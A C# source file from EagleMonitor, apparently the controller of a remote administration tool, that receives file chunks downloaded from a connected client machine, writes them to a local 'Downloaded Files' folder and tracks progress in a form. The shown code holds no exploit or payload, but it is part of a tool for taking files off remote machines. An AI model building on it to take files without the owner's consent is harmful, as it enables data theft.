using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class DownloadFilePacketHandler
    {
        public DownloadFilePacketHandler(DownloadFilePacket downloadFilePacket, ClientHandler clientHandler) : base()
        {
            string formName = downloadFilePacket.baseIp + ":" + Miscellaneous.SplitPath(downloadFilePacket.fileName);

            ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].BeginInvoke((MethodInvoker)(() => 
            {
                using (var stream = new FileStream(ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), FileMode.Append))
                {
                    stream.Write(downloadFilePacket.file, 0, downloadFilePacket.file.Length);
                }

                ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].clientHandler = clientHandler;
                ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].currentDownloaded += downloadFilePacket.file.Length;
                ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].guna2ProgressBar1.Value += downloadFilePacket.file.Length;

                decimal pourcentage = (decimal)ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].currentDownloaded / ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].totalSize;
                decimal final = Decimal.Round(pourcentage * 100, 2);

                ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].label2.Text = $"{final}%";

                ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].labelSize.Text = $"{Miscellaneous.Numeric2Bytes(ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].currentDownloaded)} / {Miscellaneous.Numeric2Bytes(ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].totalSize)}";

                if (ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].currentDownloaded == ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].totalSize)
                {
                    ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms[formName].Close();
                    ClientHandler.ClientHandlersList[downloadFilePacket.baseIp].downloadForms.Remove(formName);
                    clientHandler.Dispose();
                }

                downloadFilePacket.file = null;

            }));
        }
    }
}
